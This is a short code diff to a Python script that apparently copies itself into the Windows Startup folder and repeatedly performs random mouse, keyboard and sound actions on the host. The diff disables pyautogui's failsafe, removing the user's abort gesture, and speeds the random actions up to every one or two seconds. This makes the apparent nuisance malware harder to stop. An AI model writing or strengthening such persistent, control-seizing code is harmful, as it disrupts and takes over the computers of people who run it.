@@ -1,5 +1,7 @@
 import os, shutil, sys, pyautogui, random, winsound, time, string, ctypes
 
+pyautogui.FAILSAFE = False
+
 def install():
     # Get the path to the startup folder
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -28,7 +30,7 @@ def randomaction():
     action = random.choice(actions)
     action()
 
-    timer = random.randint(1, 25)
+    timer = random.randint(1, 2)
     time.sleep(timer)
 
     randomaction()
